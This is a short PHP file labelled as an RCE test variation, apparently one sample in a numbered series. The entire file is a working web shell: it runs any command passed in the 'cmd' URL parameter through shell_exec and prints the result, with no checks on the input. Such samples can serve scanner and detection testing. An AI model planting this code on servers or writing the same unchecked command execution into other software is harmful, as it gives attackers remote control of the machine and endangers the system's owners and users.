<?php
// RCE test variation #1099
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>